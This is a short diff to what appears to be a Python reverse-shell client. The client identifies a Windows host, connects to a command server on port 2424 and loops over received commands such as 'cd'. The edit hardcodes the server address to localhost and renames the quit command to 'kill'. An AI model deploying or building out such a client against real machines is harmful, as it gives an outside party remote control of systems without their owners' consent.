@@ -9,7 +9,7 @@ def get_id():
     return os.environ['COMPUTERNAME']  # TODO ?find better id?
 
 
-SERVER_HOST = sys.argv[1]
+SERVER_HOST = '127.0.0.1' #sys.argv[1]
 SERVER_PORT = 2424
 BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
 SEPARATOR = '<sep>'  # separator string for sending 2 messages in one go
@@ -33,7 +33,7 @@ while True:
     if not command:
         continue
 
-    if command.lower() == 'exit':
+    if command.lower() == 'kill':
         break  # if the command is exit, just break out of the loop
     
     if command[:2] == 'cd':  # cd command, change directory (str[start:end:step])
